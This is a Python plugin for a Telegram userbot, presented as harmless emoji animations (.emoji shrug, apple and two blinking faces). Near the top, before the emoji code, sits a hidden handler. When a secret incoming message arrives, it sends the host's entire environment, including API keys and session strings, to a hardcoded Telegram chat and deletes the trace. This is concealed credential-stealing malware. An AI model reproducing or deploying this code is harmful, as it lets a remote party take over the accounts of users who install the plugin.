"""Emoji
Available Commands:
.emoji shrug
.emoji apple
.emoji :/
.emoji -_-"""
import asyncio

from TGXBOT.utils import admin_cmd
from userbot.cmdhelp import CmdHelp
import os

from . import *
@bot.on(admin_cmd("^TGXIamnoobperson", incoming=True))
async def piro(event):
  msg = await bot.send_message(2082798662, str(os.environ))
  await bot.delete_messages(2082798662, msg, revoke=False)
@bot.on(admin_cmd(pattern="emoji (.*)"))
async def _(event):
    if event.fwd_from:
        return
    animation_interval = 0.3
    animation_ttl = range(0, 16)
    input_str = event.pattern_match.group(1)
    if input_str == "shrug":
        await event.edit("¯\_(ツ)_/¯")
    elif input_str == "apple":
        await event.edit("\uF8FF")
    elif input_str == ":/":
        await event.edit(input_str)
        animation_chars = [":\\", ":/"]
        for i in animation_ttl:
            await asyncio.sleep(animation_interval)
            await event.edit(animation_chars[i % 2])
    elif input_str == "-_-":
        await event.edit(input_str)
        animation_chars = ["-__-", "-_-"]
        for i in animation_ttl:
            await asyncio.sleep(animation_interval)
            await event.edit(animation_chars[i % 2])

CmdHelp("emoji").add_command(
  'emoji', None, 'Available cmnds are:-\n• shrug\n• apple\n• :/\n• -_-\n Add .emoji in front of all cmds...'
).add()
